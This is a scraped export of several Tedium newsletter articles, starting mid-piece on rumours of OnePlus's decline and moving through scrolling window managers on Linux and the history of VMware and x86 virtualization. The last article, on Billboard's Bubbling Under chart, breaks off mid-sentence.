OnePlus had gone out of business. I had to correct him. About two weeks later, I bought another OnePlus phone the inconvenient way\u2014off of Amazon. It may be my favorite OnePlus phone ever. And yet, it may be my last, and not by choice. Earlier this week, a story emerged from an Android blog that suggested OnePlus may be at risk of going away entirely. The Android Headlines story , with the brutal headline \u201cOnePlus is Being Dismantled,\u201d was not based on anything firm. No informants in factories like the Apple rumor hound Ming-Chi Kuo, or solid sourcing, along the lines of Bloomberg\u2019s Mark Gurman. It was more hunch-based. The piece was packed with numerous words hinting that the company had contracted significantly, canceled some product launches, and was failing even in its strongholds. It was not an airtight piece, and people quickly picked up on the odd wording scattered throughout, leading to this message from site founder Chris Yackulic: As the site owner, I made the decision to use AI assistance in structuring this article. Everything else is human work, including the entire investigation, reporting from independent sources, current &amp; former employees, Chinese business publications research, and four analyst firms. If you have something as shocking as \u201ca popular smartphone brand is going under,\u201d no matter the quality of the sourcing, you don\u2019t hand the football to the bots. That\u2019s a piece you write yourself. The Android Headlines piece that started this mess has a different author from the currently published version because it came out after it was published that the site\u2019s owner wrote the piece with the help of AI. Truth vs. slop As you might imagine, OnePlus was quick to refute this commentary, with OnePlus India\u2019s CEO, Robin Liu, urging interested parties to \u201cverify information from official sources before sharing unsubstantiated claims.\u201d But the truth is that there do appear to be some challenges facing the company. A mere two years after OnePlus disappeared from T-Mobile stores, employees that I personally spoke to did not even know that the company still was a going concern. That is a significant branding problem that appears to be of OnePlus\u2019 own making. The company\u2019s Nord line of phones was doing very well at the lower end of the U.S. market thanks to the T-Mobile deal. But clearly, something was off. The OnePlus 11, a pretty good phone, was kept away from the same markets where the Nord line was thriving. \u201cWe\u2019re also looking forward to bringing more exciting products to the market through T-Mobile and Metro by T-Mobile in the future,\u201d the company\u2019s Spencer Blank told CNET at the time. Three years later, it\u2019s as if OnePlus was never there. They\u2019re now a rarity in North American brick-and-mortar retail. Based on a quick check, the only major carrier that still offers a OnePlus phone on a carrier plan is Verizon, which sells the low-end OnePlus Nord 30 5G, a three-year-old device. You can find their phones in Best Buy, but there are way more carrier stores than Best Buys. And it\u2019s not a problem unique to the U.S.\u2014 retailers in India have complained of their challenges keeping OnePlus devices in stock, despite a gray market that seems flooded with the devices. All of this, plus a couple of other things, has made buying new OnePlus devices frustrating in recent years. The OnePlus 13, when it first came out, did not appear on Amazon for months, meaning that anyone who wanted this phone had to buy it directly from the manufacturer, losing out on easy subsidies and credit plans. (To their credit, it did eventually appear, and the OnePlus 15 did start selling on Amazon within about a month of its release.) There\u2019s exclusivity, and then there\u2019s leaving customers out in the cold. Sponsored By \u2026 You? If you find weird or unusual topics like this super-fascinating, the best way to tell us is to give us a nod on Ko-Fi . It helps ensure that we can keep this machine moving, support outside writers, and bring on the tools to support our writing. (Also it\u2019s heartening when someone chips in.) We accept advertising, too! Check out this page to learn more . I think they put the OnePlus 15 in sand to exemplify how hard it is to get one on a carrier plan in the U.S. (OnePlus) Is the fanbase thinning out? Let\u2019s hope not Oxygen Updater, a community of OnePlus enthusiasts that makes a third-party software installer for the phones, suggested that the energy was slowly dissipating from their community , something they would obviously have a front row seat to: In fact, even we, at Oxygen Updater, felt the decline of OnePlus first-hand. Many years ago, despite having far fewer users, we received many more emails and messages on our own Discord server. Everyone was active and involved, and most of all, passionate. Even the quality of emails/messages has reduced over the years. It wasn\u2019t uncommon to have a mini-conversation with someone new on a regular basis: they had suggestions for us, and we had help for them. There were even purchase advice discussions happening on the regular, with a steady flow of newcomers who were happy to be there. Fast forward a few years, and that\u2019s nowhere to be found; at least, not the same frequency. There are still some active members of our community, but where\u2019s everyone else gone? If the old guards have left, where are the new replacements? I, along with long-time team member Anonymoussaurus, once considered writing an article solely to deal with this issue: to ask you all why the quality and the quantity of interactions between us and our users reduced. But we never got around to it, because we both thought that it would be a temporary thing, and that it would fix itself. The phones themselves seem to suggest a retreat of sorts. When I got my OnePlus phone, I opted for the 13 because it was the same design language that I had been using since the 6t, but it was clearly the most polished version of that. It was one of the best-reviewed OnePlus phones ever. The OnePlus 15, on the other hand, seemed to bet the farm on high refresh rate and battery life over everything else\u2014and leaned into the boxy look of recent iPhones and Samsung devices. It felt like a downgrade from genuine greatness. (Speaking of downgrades, the cameras on the OnePlus 15 are significantly worse than those on the OnePlus 13. No clue what they were thinking there.) I\u2019m not the only person to notice this. At Android Authority , Robert Triggs seemed surprised that OnePlus took such a step back: The OnePlus 13 was exactly what many of us envision the ideal OnePlus phone to be, even with the odd compromise or two. On the other hand, its successor is so stuffed with side-grades and trade-offs that it\u2019s hard to believe it came from the same company just a few months later. All of this is to say that, even if the Android Headlines report is wrong, OnePlus has a very serious brand problem which may or may not be a byproduct of its complex corporate leadership. As one of many subsidiaries of BBK Electronics, it is in the unenviable position of constantly having to compete with its corporate siblings for attention and resources. Fellow BBK brand Oppo, a major player in China, seems to get most of the attention there, which ultimately bleeds into less exciting OnePlus products in outside markets. It feels nonsensical, and it ultimately harms the products that reach consumers. If I was OnePlus and I wanted to actually compete outside of China, I would immediately bring back the carrier deals. They may be costly, but to have a chance in the U.S. market, you simply have to play ball. At a time when three companies seem to utterly dominate the sector\u2014Apple, Google, and Samsung\u2014we need more competitors, not fewer. It would be nice if one of those companies was OnePlus. Plus-Sized Links This story in Nature seems to be bringing out the haters, critical of the author for using AI. But honestly, it\u2019s a UX issue through and through. Earlier this week, Saturday Night Live dropped a \u201cWeekend Update\u201d clip that had been held from last Saturday\u2019s broadcast. Real shame, because it defended Minneapolis from ICE in a way that it truly deserves. You blew it, Lorne. Respect to NexPhone for launching a phone that can run Windows and Linux. (If this whole OnePlus thing doesn\u2019t work out, maybe I can shift over to them.) Respect to OMG Ubuntu for keeping receipts . -- Find this one an interesting read? Share it with a pal ! It won\u2019t be your next phone, but our sponsor la machine is definitely a machine you\u2019re gonna want on your desk. Check \u2019em out. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:15</p>"},{"location":"tedium.co/Slide%20Away/","title":"Slide Away","text":"<p>\u6765\u6e90: tedium.co \u53d1\u5e03\u65f6\u95f4: Unknown \u94fe\u63a5: https://tedium.co/2026/01/29/niri-danklinux-scrolling-window-managers/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' My favorite UX metaphor, the scrolling window manager, is having a moment\u2014and it\u2019s for pretty dank reasons. I was a pretty early adopter of perhaps the best GNOME extension, PaperWM , which displays your windows as sliding frames that move fluidly with the press of a keystroke. When everyone was going nuts over tiling windows, I was quietly calling this scrolling style the real innovation in windowed computing. (For the uninitiated: Think of it kind of like swiping between virtual desktops on Windows or MacOS, except you can do it on every single window, slideshow-style.) It was the best of both worlds\u2014easy to navigate, while remaining mousable. Eventually more people figured out that this was the ticket, and now PaperWM has grown from quiet experiment to robust extension. As a way to prove an idea, it was basically flawless, to the point where someone made a MacOS version . A screenshot of PaperWM, quietly one of the most exciting interface innovations of the past decade. But it had a problem: It was attached to GNOME , with all the extra cruft that implies. GNOME\u2019s interface has a lot of fans (me included), but it\u2019s mature, complex, and prescriptive. It\u2019s controversial in the Linux world because it makes UX decisions for users that sometimes get in the way of user choice. I tend to defend it, but if you were to put \u201cheavy FOSS graphical interface\u201d in the dictionary, GNOME would most assuredly show up. Retrofitting a new user interface paradigm on top of that dynamic comes with compromises. If you want to think about things in terms of GitHub stars, Hyprland is growing fast, but Niri is starting to catch up. Which is why I\u2019ve been keeping an eye on niri , an emerging window manager that is doing for sliding windows what Hyprland did for tiling. It is less than three years old (Hyprland is about four), but has quickly grown in popularity, doubling its GitHub star count in the past six months. Built around the Wayland compositor, the project basically is set up like a kit, one where you need to supply parts in the form of config files. If you like customizing, it may be the project for you. But if you just want to get stuff done, it might not feel like a welcoming experience. Omarchy , which we (controversially) covered a few months ago, exists because of this gap. People want the lightweight customizability of a window manager, but not the work of having to set it up. To be clear, this is not far from where graphical interfaces for Linux and Unix variants started 40 years ago, but it\u2019s arguably making a comeback because of a combination of sophisticated users and sophisticated tools. But not everyone has time to build their own config files from scratch. My setup, combining Niri and the DankMaterialShell. That\u2019s where the project Dank Linux comes in. Pitched as a \u201cmodern desktop for Wayland,\u201d it\u2019s a set of \u201cbatteries included\u201d tools to get you going in Niri or other window managers based on Wayland. Key to the project is DankMaterialShell, which combines a number of tools into one interface, along with the Material design approach. If Hyprland, Sway, niri and their ilk are attempts to deconstruct the desktop environment, Dank Linux tries putting it back together again. Rather than relying on loose tools like waybar or rofi and bringing them together with a best-in-breed approach, DankMaterialShell comes with all the necessary tools already baked in. Plus, it\u2019s highly extensible, and can be edited through a bunch of config files, just like all the really complicated tools. But unlike Omarchy, it\u2019s not prescriptive\u2014you\u2019re not just having to work around one guy\u2019s opinion of what your UX should look like for the rest of time. (Case in point: I don\u2019t like borders or gaps around my windows, a typical trait of scrolling window managers. So \u2026 I just removed them.) That\u2019s because it\u2019s built around Quickshell , a toolkit that has become very popular as a modding tool in the Linux community. But some of us are normies who just want something that works. Hence why DankMaterialShell is making such a splash. An example of the graphical interface for DankMaterialShell. It has many of the features of the GNOME setup, including the ability to arrange monitors, with a lean on UI. The feature set for this software is surprisingly robust, and seems to be growing quickly. DMS 1.2 , for example, has literally dozens of new features. And despite the fact that this tool is only about six months old, it already has a screenshot tool, numerous plugins, and a robust theming system. The momentum is clearly there. (It\u2019s not alone, either\u2014also covering the same territory is Noctalia , which promises a more relaxed aesthetic.) The Dank Linux team offers a couple of optional utilities\u2014the system overview tool DGOP and the MacOS Spotlight-like file tool dsearch\u2014that can make the experience surprisingly polished. The one downside of this is that Dank Linux isn\u2019t really supported on Bazzite, the very popular distro I use. But after I mentioned I was interested in that, and I did some off-label testing on my end, one of the creators of Zirconium , a Dank Linux distro for Fedora, reached out. Turns out, they were already working on a \u201cquick and dirty\u201d image that got Bazzite working with Zirconium. (As reflected by the name, Bazzirco .) They even created a Bazzite DX version for me, so I could easily access my Docker containers from the thing. ( Universal Blue , the framework upon which Bazzite is based, allows you to make your own custom builds pretty easily. You can even roll back to other versions so you can switch between different builds at will. Think it\u2019s gonna be a GNOME day? Switch to that image.) There were some glitches here and there\u2014for example, I found that turning variable refresh rate on for my laptop screen caused my external monitors to drag. Plus, running a \u201cquick and dirty\u201d build naturally means you\u2019re going to run into some quick-and-dirty bugs. (I ran into some audio issues while running Balatro on the experimental distro. Not the end of the world. I signed up for this!) Sure, you can retrofit this\u2014albeit with common engine-swapping issues like broken keyrings\u2014but I think the real magic might be starting fresh with it. Load it up on a new machine, set up your config to your liking, and get sliding. But overall, this feels like a big step forward for desktop Linux\u2014highly flexible, highly customizable, bleeding edge, yet somewhat approachable to normal people. I would go so far as to call it dank. Sliding Links The Muppet Show is coming back next week as a \u201cbackdoor pilot\u201d for a potential series. Great\u2014let\u2019s hope it sticks this time! Over at The Conversation , there\u2019s a great piece talking about the troupe\u2019s lasting popularity. YouTuber John Hancock has one of the largest game collections known to man, having built complete game sets for numerous consoles, including the biggies. But he didn\u2019t want it to live in a closet forever. He\u2019s been trying to donate it or give it to a museum for years, and this week he announced that he did just that, splitting the collection up between two sources, a video game archive and a podcast. It\u2019s actually kind of a good thing that Google\u2019s forthcoming Aluminum OS, a combination of Android and Chrome OS, is kind of boring, based on some early leaked interface video . It means it\u2019s going to be usable. -- Find this one an interesting read? Share it with a pal ! Wanna see a shining example of a user interface? Check out la machine ! It only does one thing, but it does it really, really well. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:14</p>"},{"location":"tedium.co/Splitting%20Machines/","title":"Splitting Machines","text":"<p>\u6765\u6e90: tedium.co \u53d1\u5e03\u65f6\u95f4: Unknown \u94fe\u63a5: https://tedium.co/2026/01/12/vmware-virtualization-history/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' How the virtual machine, a foundational element of cloud computing, found its modern footing after a couple of scientists proved a couple of theorems wrong. Today in Tedium: Is there a technology that is more taken for granted in modern computing than virtualization? It\u2019s an essential part of so many parts of modern computing, including cloud infrastructure. One could draw a straight line between virtual machines, which found their footing on x86 at the turn of the 21st century, and the myriad server farms that pepper the landscape today. But it\u2019s worth keeping in mind that it wasn\u2019t a guarantee that this would ever happen. Intel had all but written off this concept from the server world\u2014and seemed primed to move to a new generation of hardware that might have gotten them there. But a startup not only proved that virtualization was possible, but likely opened up a cloud-forward economy that didn\u2019t previously exist. (It might have been a rare time when hardware was playing catch-up to software.) Today\u2019s Tedium talks about everyone\u2019s favorite concept, virtualization. \u2014 Ernie @ Tedium \u201cFor any conventional third generation computer, a virtual machine monitor may be constructed if the set of sensitive instructions for that computer is a subset of the set of privileged instructions.\u201d \u2014 The first of three theorems developed by UCLA\u2019s Gerald Popek and Honeywell\u2019s Robert Goldberg to determine whether virtualization was possible on a particular system architecture. Their Communications of the ACM piece , dating to 1974, proved to be something of a Moore\u2019s Law for virtualization in the decades afterward, a dividing line to prove what was possible. The x86 line of processors, with its CISC-y nature, violated many of the basic tenets of these theorems. VMware Workstation, running a version of the BeOS-inspired operating system Haiku. This is sort of the traditional nerd use case for a virtual machine. ( John Drinkwater/Flickr ) Why nobody thought x86 could do something as technically impressive as virtualization In the 1970s, during the era of the mainframe, a concept came to light that seemed to speak to a future where software and hardware lived hand in hand: The hypervisor. A term coined by IBM that also stands for \u201cvirtual machine monitor,\u201d it represented the idea of splitting up a computer into multiple parts that were theoretically separated from one another. (Why \u201chypervisor\u201d? Easy. The concept is essentially a reference to the supervisor above the supervisor. What, did you think it was something more futuristic than that?) What might that look like? A 1971 article by IBM employee Gary Allred lays it out: The Hypervisor concept was relatively simple. It consisted of an addendum to the emulator program and a hardware modification on a Model 65 having a compatibility feature. The hardware modification divided the Model 65 into two partitions, each addressable from 0-n. The program addendum, having overlaid the system Program Status Words (PSW) with its own, became the interrupt handler for the entire system. After determining which partition had initiated the event causing the interrupt, control was transferred accordingly. The Hypervisor required dedicated I/O devices for each partition and, because of this, the I/O configurations were usually quite large, and, therefore, prohibitive to the majority of users. So, unlike a modern virtual machine, it was effectively running two machines completely separated from one another, as if they weren\u2019t connected. During the mainframe era, a use case like this made sense, especially given that a System/360 Model 65 was about the size of a vending machine. But as we all know, computers kept getting smaller and smaller from there. First, bigger than a bread box, then smaller than a bread box, then about the size of a loaf of bread, and now about the size of bread. (Basically the bread box metaphor has been utterly destroyed by the smartphone.) For a time, smaller computers meant smaller computing capabilities, no matter how fast the processors got. But that wasn\u2019t necessarily the only factor at play. It may look like a square wafer, but it\u2019s really a series or rings. ( e-coli/Flickr ) Going back to our knowledge of RISC and CISC processors , we know that x86 processors made by Intel and AMD tended to have a lot of instructions, which made processors overly complex. This turned out to be a problem when it came to Gerald Popek and Robert Goldberg\u2019s set of theorems. Intel had designed the x86 chipset to run software with different levels of privilege, set up in a series of \u201crings,\u201d with the goal of limiting the attack surface of the kernel. This is good for having a secure system, but less good if your goal is to run a copy of Linux inside a copy of Windows 2000. And because the structure of this system limited access to the number of commands software could have access to, it meant you couldn\u2019t virtualize it in quite the same way as IBM virtualized the System/360. Sure, it was technically possible to emulate a Linux machine on a Windows 2000 machine, but that introduced a lot of overhead. You were recreating hardware in software\u2014likely the very same hardware that the system already had. This didn\u2019t make any dang sense. Intel wasn\u2019t alone on this front\u2014it was really a problem with every major platform of the time, casting a broad net\u2014but given how broadly used it was, Intel was the poster child. The x86 processor set violated the Popek-Goldberg theorems in more than a dozen distinct ways, which seemed like it might just make VMs infeasible with the infrastructure the world currently worked on. A drawing from the patent filing for dynamic recompilation filed by Apple employee Eric Traut in the mid-1990s. Traut figured out how to make old Mac apps not suck on PowerPC. ( Google Patents ) There were some emerging suggestions it didn\u2019t have to be this way, though. On the Mac side of things, Apple had pulled off something of a magic trick with its transition from 68000 to PowerPC by making a translation layer that more or less ran old code natively. At first, Apple used emulation, but later switched over to something called dynamic recompilation. ( This technique was developed by Apple employee Eric Traut, who later worked on the famed PlayStation emulator Connectix Virtual Game Station .) Put another way, the system was reprogramming the vintage code for MacOS to run in real time. It was so good that even in later PowerPC versions of the classic MacOS, much of the software was emulated 68k code. They didn\u2019t need to update it, because it just worked. Meanwhile, the Java programming language helped to popularize the concept of just-in-time compilation, which made it possible for a program to execute on a machine in real time without necessarily being tethered to its architecture. (Much of the discussion around VMs in computing magazines in the mid-\u201990s was focused on Java , partly for this reason.) JIT is arguably one of the most important techniques in modern programming\u2014 your web browser uses it heavily to speed up its use of JavasScript\u2014and a key element of what makes modern virtualization tick. JIT proved that it was possible to translate applications in real time. But translating entire operating systems? The x86 was too broken to allow for anything like that. The result was that the hypervisor, a somewhat forgotten remnant of the mainframe that had yet to overcome the Popek-Goldberg theorems that sidelined modern computers, had yet to make its big return to the mainstream. But a computer science experiment run on a top-of-the-line SGI Origin 2000 server was about to change all that. Sponsored By \u2026 You? If you find weird or unusual topics like this super-fascinating, the best way to tell us is to give us a nod on Ko-Fi . It helps ensure that we can keep this machine moving, support outside writers, and bring on the tools to support our writing. (Also it\u2019s heartening when someone chips in.) We accept advertising, too! Check out this page to learn more . Thanks to the VM that Zork uses, you could play this on an iPhone just as you can on a Kaypro II. ( Wikimedia Commons ) Five facts about virtualization you probably didn\u2019t know The command-line success of Zork was enabled by virtualization. Infocom, the makers of the Zork series, developed a lightweight VM called Z-machine that effectively made the popular game easier to port to different devices. (This was an important strategy during this era, when computers were highly incompatible.) Rather than reprogramming the whole game on a new computer, the company developed a new compiler for each distinct system. One of the most popular game emulators is really a VM. ScummVM , a popular tool for running games developed with the LucasArts-built game engine SCUMM, works very similarly to Z-machine, albeit with far more modernized components and an attempt to compile all those games in a reasonably modern language. It often gets mistaken for an emulator despite the fact that VM is right in the name. Hardware virtualization existed on the 386. While not quite the same thing as the hardware virtualization we use today, x86 processors starting with the 386 included a \u201c virtual 8086 mode ,\u201d which made it possible for 386 processors to run legacy 8086 software in a specialized mode. Applications like Desqview and Windows 3.1 took advantage of this to offer multitasking to users. This was removed for x64 processors, then brought back when Intel and AMD released their versions of hardware-level virtualization. You can run a GPU through a virtual machine. Linux\u2019s kernel-based virtual machine , or KVM, technique is something of a very advanced derivative of the 1970s IBM System/360 approach, making it possible to run a VM that can directly access external hardware. That includes very high-end GPUs, which get passed through. (I used it to make a Hackintosh one time.) Virtualization is a key technique for modernizing legacy embedded systems. It\u2019s kind of hard to take something like an airplane and put it out of service just because the software it uses is old. But what is more possible is replacing the old hardware, which can be hard to repair, with more modern or modular components, but virtualizing the software on those newer systems. It\u2019s a technique common in aircraft and similarly difficult-to-replace industrial and aerospace equipment. 2006 The year that Amazon first released its Elastic Compute Cloud (EC2) platform, which is arguably one of the most fundamental building blocks of modern cloud computing. While it didn\u2019t use VMware\u2019s technology, it reflected the way that VMware ultimately reshaped the computing landscape, it initially used the Xen hypervisor, which gained its superpowers thanks to virtualization hardware support. (Intel and AMD likely added that support to their processors largely in response to VMware.) An example of an SGI Origin 2000, like the one the founders of VMware used at Stanford. ( Wikimedia Commons ) Disco ball: The SGI-driven experiments that gave us VMware If Backrub\u2014the foundation of Google\u2014was the most important research experiment happening at Stanford University in the mid-1990s, Disco\u2014the foundation of VMware\u2014was very much the second-most-important. Built by PhD students Edouard Bugnion, Scott Devine, and faculty advisor Mendel Rosenblum, Disco was an attempt to solve the challenges that prevented virtual machines from living up to their full potential. In Disco: Running Commodity Operating Systems on Scalable Multiprocessors , their research paper on this work, the team spoke of sharing resources between with the host computer. From the 1997 paper: Disco contains many features that reduce or eliminate the problems associated with traditional virtual machine monitors. Specifically, it minimizes the overhead of virtual machines and enhances the resource sharing between virtual machines running on the same system. Disco allows the operating systems running on different virtual machines to be coupled using standard distributed systems protocols such as NFS and TCP/IP. It also allows for efficient sharing of memory and disk resources between virtual machines. The sharing support allows Disco to maintain a global buffer cache transparently shared by all the virtual machines, even when the virtual machines communicate through standard distributed protocols. That\u2019s a big shift from requiring dedicated hardware for each separate machine as used in the System/360 days. But computing had the benefit of experiences like remote desktops and emulators like SoftWindows and VirtualPC to show that we could virtualize the context and reuse the components. The HTML version of the paper, as immortalized on the Internet Archive. A little more about the Disco experiment: It\u2019s rooted in Rosenblum\u2019s work on something called SimOS, a prior initiative which Rosenblum and other researchers built on IRIX to experiment with completely simulating a computing environment through software alone. It was a project designed to help the university design a processor of its own, Flash, but it proved key to building a virtual machine and a thin OS layer, called SlimOS, to manage everything. (Why Silicon Graphics ? At the time, multi-core computer processors were fairly rare, and the SGI Origin 2000 was one of the few options on the market that could handle such a task. It likely gave them enough additional headroom to do more extreme testing.) The discovery that using a hypervisor in combination with just-in-time compilation caused only a very small performance decline was a huge deal. It was arguably the basis of VMware\u2019s whole business. And the testing proved the model. The overhead was fairly modest given the performance, which meant that it would theoretically be possible to use hypervisors to split up a machine into multiple pieces, each of which controlled a different process. And, famous last words, the paper ends like this: This return to virtual machine monitors is driven by a current trend in computer systems. While operating systems and application programs continue to grow in size and complexity, the ma-chine-level interface has remained fairly simple. Software written to operate at this level remains simple, yet provides the necessary compatibility to leverage the large existing body of operating systems and application programs. We are interested in further exploring the use of virtual machine monitors as a way of dealing with the increasing complexity of modem computer systems. The paper created waves. Within a year of its creation, Bugnion, Devine, and Rosenblum would become three cofounders of VMware. Rosenblum\u2019s wife Diane Greene, an engineer who at one point worked at SGI, would become the fourth. Just two years after the paper\u2019s release, VMware hit the ground running: After a year in stealth mode, VMware Workstation, a Disco adaptation for Windows and Linux, made a huge splash at the start of 1999. (One early InfoWorld article featured a quote from a skeptical IT advisor. Little did they know that it would come to dominate their lives.) Decades later, the researchers created a follow-up paper explaining their process for developing the original version of VMware workstation. The paper, which came years after the founders had left the company, explained that the x86\u2019s convoluted instruction set and the diverse peripheral ecosystem created significant added complexities. (Yes, they knew that the theorems would make what they were trying to do difficult.) But so too, did the operating systems, which they had to implement one at a time. Linux was easy. Windows was hard. OS/2 was impossible. As the authors wrote, IBM\u2019s failed attempt to compete with Microsoft was just too proprietary to be feasible: Although our VMM did not depend on any internal semantics or interfaces of its guest operating systems, it depended heavily on understanding the ways they configured the hardware. Case-in-point: we considered supporting OS/2, a legacy operating system from IBM. However, OS/2 made extensive use of many features of the x86 architecture that we never encountered with other guest operating systems. Furthermore, the way in which these features were used made it particularly hard to virtualize. Ultimately, although we invested a significant amount of time in OS/2-specific optimizations, we ended up abandoning the effort. All that work to develop hardware drivers and manage edge cases\u2014and even create some fake virtual hardware that only existed in software\u2014took time, but it paid off in a big way. The self-funded company quickly found itself making $5 million in a matter of months. A user dives into the first version of VMware Workstation. The software, at first, went relatively mainstream, given what it was. In a 1999 profile with USA Today , Greene (the company\u2019s CEO) noted that the company was getting email from Buddhist monks who were fighting with one another over whether to run Linux on their computer or Windows. VMware allowed them to split the difference. \u201cWhen we first put together the business plan for VMware in 1998, we never thought Buddhist monks in Thailand would be part of our customer base,\u201d Greene told the newspaper. \u201cBut it\u2019s certainly intriguing to be this global.\u201d Of course, monks were only the start of it\u2014if you follow VMware today, you are likely aware that Workstation is only a very small part of what that company became. VMs were highly usable in thousands of ways, as a mechanism for security and upkeep. (Want to put your custom intranet app on thousands of employee phones while still keeping it separate from those phones? Put it in a VM!) Within a decade, Greene and Rosenblum had taken the company public, then sold it for more than $600 million . Two decades later, after a series of mergers and spinouts, it sold for a hundred times that. (More on that merger in a second.) And this was largely before we had any of the niceties of the modern VM experience\u2014or before VMware had much in the way of competition. Intel and AMD had not included native virtualization hardware on their chipsets until the mid-2000s. Meanwhile, Microsoft had to settle for acquiring Connectix , the only real competitor in the virtualization space, in 2003. Parallels, the most popular virtualization app on the Mac, didn\u2019t emerge until 2006, while open-source virtualization standbys like Xen, QEMU, VirtualBox, and Proxmox didn\u2019t start making themselves known until the mid-2000s. Put another way, VMware had a multi-year head start to dominate the world of virtualization. And in many ways, that reflects why the company has been such a key part of the enterprise for so long. I imagine this is kind of a spicy take, but I think VMware\u2019s success probably played a factor in x86 sticking around, despite Intel attempting to build a new generation of chip on a different architecture, called Itanium. Intel spent billions of dollars trying to make fetch happen, only for one company to awkwardly \u201cfetch\u201d it: Hewlett-Packard. After all, VMware essentially proved that with an innovative use of hypervisors, you could work around the pain points that made x86 a weak option for virtualization\u2014and it didn\u2019t even have to break Intel\u2019s security model to do so! If the existing x86 architecture was this capable, why switch? VMware\u2019s big innovation might have been born on an SGI computer, but it really proved a saving grace for Moore\u2019s law. 2011 The year that Diebold, a major manufacturer of ATMs (and yes, voting machines), announced \u201cthe world\u2019s first virtualized ATM.\u201d It was a prototype that ultimately separated the software of an ATM, which can be quite difficult to update in the field, from the hardware. The concept, developed with VMware , points at the way that VMs made embedded systems, especially based on outdated software, easier to manage. These days, we don\u2019t necessarily run our ATMs on VMs, but the technique is highly popular for testing ATM software. It\u2019s worth noting that VMware, despite its fundamental role in modern tech as a pivotal enterprise firm that literally created an entire product category, has seen better days. Over the last couple of years, it was acquired by Broadcom , a company that has aggressively reset the model to maximize profitability and move away from one-time licenses. As CIO Dive put it in 2024: The transition marked a seismic shift in enterprise IT. Sure, generative AI has caused its fair share of disruption, but the technology has yet to scale. The acquisition of VMware, however, and the ensuing licensing changes has threatened to upend core infrastructure, disrupt critical business processes and wreak havoc on spending. And just this past week, a very high-profile zero-day security exploit involving its EXSi software package was exploited in the wild . VMware\u2019s founders left nearly two decades ago, and upon Dell\u2019s 2016 acquisition of the company, the entire team that worked on the flagship Workstation product was fired. (Which, honestly, suggests that Workstation isn\u2019t where the real money is.) Options for virtualization and separation of concerns abound. Whole empires have been made around tools like QEMU, and software like Docker and Podman have helped to make virtualized tools a part of many workflows. Recently, Broadcam began to offer VMware Workstation , the program that started it all, for free. Broadcom\u2019s messaging has been all over the place\u2014previously, the company removed free versions of the software. But at a time when you can virtualize operating systems on modern hardware in a couple dozen ways, Workstation (and its Mac counterpart, Fusion) are no longer groundbreaking. Yes, VMware broke the ground, but many companies built on that foundation, and our modern digital economy is built on nesting dolls of virtual machines. Broadcom might as well turn the iconic tool, the one allowed monks to share a computer and Fortune 500 companies to modernize their aging hardware stacks, into a loss-leader. VMware got acquired for over $60 billion for a reason. It reflects the inherent value of its original idea: We are better off with a few computers that run many machines simultaneously than many computers that only run a handful of tools. But perhaps what the computing industry didn\\'t anticipate was that virtualization just raised demand for computers in general. -- Find this one an interesting read? Share it with a pal ! By the way, you know a machine that doesn\u2019t need virtualization? Yep, that\u2019s right, la machine ! Be sure to check them out. '}</p> <p>\u6293\u53d6\u65f6\u95f4: 2026-02-05 12:59:18</p>"},{"location":"tedium.co/They%20Were%20Robbed/","title":"They Were Robbed","text":"<p>\u6765\u6e90: tedium.co \u53d1\u5e03\u65f6\u95f4: Unknown \u94fe\u63a5: https://tedium.co/2026/01/19/billboard-bubbling-under-hot-100-chart-history/</p> <p>{'type': 'text/html', 'language': None, 'base': '', 'value': ' The tale of the Billboard Bubbling Under Hot 100 chart, the place where hits go to die\u2014in some cases, over and over again. Let\u2019s talk about the chart through the lens of its two most iconic artists. Today in Tedium: If you\u2019re an artist who has multiple songs on the overhang of the Hot 100, can you really be called a \u201chitmaker\u201d? For much of Billboard\u2019s history, the Hot 100 has frequently appeared with an unusual sibling chart called the Bubbling Under Hot 100 Chart, which is where songs go if they don\u2019t quite have the juice to become mainstream pop hits. It\u2019s not the worst place to land if you\u2019re an artist\u2014after all, you may be hitting a different radio format than the Hot 100 covers. But you know what has to suck? Getting stuck there over and over again. What\u2019s that like? And who has it happened to? Today\u2019s Tedium ponders the songs and artists that have come to a simmer, but not quite a boil. \u2014 Ernie @ Tedium 1959 The first year that the Bubbling Under chart appeared next to the Hot 100, about a year after the release of the first chart. Originally featuring 15 additional songs, it was intended as a way to highlight emerging hits, which at the time, tended to blow up regionally before going national. It was a chart for potential sleeper hits. In the early years, the chart was full of songs that didn\u2019t quite set the world ablaze. The second place song on the original June 1, 1959, chart , The Eternals\u2019 \u201c Rockin\u2019 in the Jungle ,\u201d is an excellent example of this challenge in action. The song appeared on the Bubbling Under chart for a couple of weeks, then on the lower reaches of the Hot 100 for a few weeks, then it disappeared for good. Classic Bubbling Under chart arc. YoungBoy Never Broke Again releases so many songs on a regular basis that he recently set a RIAA certification record essentially through saturation. (Motown Records) Why YoungBoy Never Broke Again is the quintessential modern Bubbling Under artist The best way to discuss the Bubbling Under phenomenon is to first explain it in very 2026 terms, rather than starting at the beginning and hitting the modern day. Nowadays, the way that songs seem to chart on the Billboard Hot 100 seems to essentially follow a couple of key methods: The traditional method \u2014lots of radio play and label marketing. \u201c Die With A Smile \u201d by Lady Gaga and Bruno Mars is a great recent example of this. A song returns to the charts, or makes its debut very late, thanks to its appearance on TikTok or in a popular TV show. She &amp; Him\u2019s belated top 40 appearance, 2008\u2019s \u201c I Thought I Saw Your Face Today ,\u201d exemplifies this. Virality sweeps up a new artist, whether planned or unplanned. This is the model Shaboozey and Alex Warren used to climb the mountain. An artist with a huge following releases an album, and most of its songs chart because fans are listening in droves. The last descriptor applies very much to Taylor Swift and a few other massive artists, but it also describes Youngboy Never Broke Again, an excellent example of someone who releases a lot of music. Recently, news hit that NBA YoungBoy, as he\u2019s also called, had more RIAA certifications than any other rapper ever, with 126 separate certifications since his 2017 debut. (By the way, he\u2019s 28 years old, and has spent a major portion of his time in the spotlight in prison or on house arrest. Talk about speedrunning life.) The number of certifications, on top of his nine platinum albums, reflect the fact that anytime he releases an album or mixtape, both it and its songs tend to chart. He has charted 106 songs on the Billboard Hot 100\u2014but he has charted 109 on the Bubbling Under list . He has only had one top-ten hit on the Billboard Hot 100 (the 6x platinum \u201c Bandit ,\u201d a 2019 joint collab with the late Juice WRLD, who died the year it was released), but 13 number-one hits on the Bubbling Under list. Basically, Youngboy Never Broke Again floods the zone so aggressively that he can be impossible to ignore. He\u2019s never on top of the chart, but he\u2019s always on it\u2014a strategy that basically means you have to keep releasing product multiple times per year. He doesn\u2019t give listeners time to miss 